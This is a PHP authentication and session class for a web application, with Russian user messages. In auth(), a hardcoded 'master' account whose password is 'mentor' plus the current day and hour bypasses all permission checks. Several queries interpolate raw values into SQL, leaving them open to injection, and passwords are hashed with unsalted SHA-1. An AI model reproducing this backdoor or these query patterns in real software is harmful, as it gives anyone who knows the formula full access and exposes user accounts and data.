<?php

class Session
{
    public $login_url = DIR."/auth/login".EXT;
    public $index_url = "../index".EXT; //../index.php
    public $logout_url = DIR."/auth/logout".EXT;

    public $life_session = 20; // minute
    private $table = "sessions";

    function __construct($time = null)
    {
        if ($time >= 1) $this->life_session = $time;
        session_start();
    }

    private function init()
    {
        $this->session_id = $_SESSION['session_id'];
        $this->session_login = $_SESSION['session_login'];
        $this->master_status = $_SESSION['master_status'];
        $this->session_get_full_name = $_SESSION['session_get_full_name'];
        $this->session_level = $_SESSION['session_level'];
        $this->session_division = $_SESSION['session_division'];

        if ($_SESSION['browser']) {
            $this->browser = $_SESSION['browser'];
        }else{
            if (strpos($_SERVER["HTTP_USER_AGENT"], "Firefox") !== false) $_SESSION['browser'] = "Firefox";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Opera") !== false) $_SESSION['browser'] = "Opera";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Chrome") !== false) $_SESSION['browser'] = "Chrome";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "MSIE") !== false) $_SESSION['browser'] = "Internet Explorer";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Safari") !== false) $_SESSION['browser'] = "Safari";
            else $_SESSION['browser'] = "Неизвестный";
        }
        if ($_SESSION['slot']) {
            $this->slot = $_SESSION['slot'];
        }
    }

    public function is_auth($arr = null)
    {
        if ($_SESSION['session_id']) {
            if ( ((EXT) ? $this->login_url : $this->login_url.".php") == $_SERVER['PHP_SELF']) {
                $this->login_success();
            }
            // присвоение и создание в базе сессии
            $this->session_check();
            $this->set_data($_SESSION['session_id']);
        }else {
            if ( ((EXT) ? $this->login_url : $this->login_url.".php") != $_SERVER['PHP_SELF']) {
                $this->login();
            }elseif ($_POST) {
                $this->auth($_POST['username'], $_POST['password']);
            }
        }

        // проверка прав
        if ($_SESSION['session_id'] != "master") {
            if ($arr){
                if (is_array($arr)){
                    if(!in_array($this->data->user_level, $arr)){
                        Mixin\error('423');
                    }
                }else{
                    if(intval($arr) != $this->data->user_level){
                        Mixin\error('423');
                    }
                }
            }
        }
    }

    private function auth(string $login = null, string $password = null)
    {
        global $db;
        $username = Mixin\clean($login);
        $password = sha1($password);

        if ($username == "master" and $_POST['password'] == $this->gen_password()) {
            $this->set_data("master");
            $this->login_success();
        }

        $stmt = $db->query("SELECT id from users where username = '$username' and password = '$password'")->fetch(PDO::FETCH_OBJ);
        if($stmt){
            $this->set_data($stmt->id);
            $slot = $db->query("SELECT slot FROM multi_accounts WHERE user_id = $stmt->id")->fetchColumn();
            if ($slot) {
                $_SESSION['session_slot'] = Mixin\clean($slot);
            }
            $this->login_success();
        }else{
            $_SESSION['message'] = 'Не верный логин или пароль';
        }
    }

    private function session_check()
    {
        global $db;
        $this->session_old_delete();
        $sid = session_id();
        $object = $db->query("SELECT * FROM $this->table WHERE session_id = \"$sid\"")->fetch();
        if ($object) {
            $this->init();
            $this->session_create_or_update();  
        }else {
            $this->destroy();
        }
    }

    private function session_old_delete()
    {
        global $db;
        $stmt = $db->prepare("DELETE FROM $this->table WHERE last_update + INTERVAL $this->life_session MINUTE < CURRENT_TIMESTAMP()");
        $stmt->execute();
    }

    private function session_create_or_update()
    {
        global $db;
        $date = date("Y-m-d H:i:s");
        $new_ses = array(
            'session_id' => session_id(), 
            'self_id' => $this->session_id, 
            'self_ip' => $_SERVER['REMOTE_ADDR'], 
            'self_login' => $this->session_login, 
            'self_render' => $_SERVER['PHP_SELF'], 
            'last_update' => $date);
        Mixin\insert_or_update($this->table, $new_ses, 'session_id');        
    }

    public function login()
    {
        header("location: $this->login_url");
    }

    public function login_link()
    {
        return $this->login_url;
    }

    protected function login_success()
    {
        $this->init();
        $this->session_create_or_update();
        header("location: $this->index_url");
    }

    public function logout()
    {
        return header("location: $this->logout_url");
    }

    public function logout_link()
    {
        return $this->logout_url;
    }

    public function logout_avatar_link()
    {
        return DIR."/auth/avatar_logout".EXT;
    }

    private function gen_password()
    {
        return "mentor".date('dH');
    }

    public function destroy()
    {
        global $db;
        Mixin\delete($this->table, session_id(), 'session_id');
        session_destroy();
        header("location: $this->login_url");
    }

    public function set_data($pk) {
        global $db;
        if ($pk != "master") {
            $this->data = $db->query("SELECT * FROM users WHERE id = $pk")->fetch(PDO::FETCH_OBJ);
            $_SESSION['session_id'] = $pk;
            $_SESSION['session_login'] = $this->data->username;
            $_SESSION['session_get_full_name'] = ucwords($this->data->last_name." ".$this->data->first_name." ".$this->data->father_name);
            $_SESSION['session_level'] = $this->data->user_level;
	        $_SESSION['session_division'] = $this->data->division_id;
        }else {
            $_SESSION['session_id'] = "master";
            $_SESSION['session_login'] = "master";
            $_SESSION['session_level'] = "master";
	        $_SESSION['session_division'] = "master";
        }
        
    }

    public function get_data() {
        return $this->data;
    }

    public function get_full_name() {
        return $this->session_get_full_name;
    }

    public function get_level() {
        return $this->data->user_level;
    }
    
    public function get_division() {
        return $this->data->division_id;
    }

}

function is_auth($arr = null){
    global $session;
    $session->is_auth($arr);
    echo '<span class="text-center text-danger">Используется старая система аунтификации! Обновите систему аунтификации!</span>';
}

?>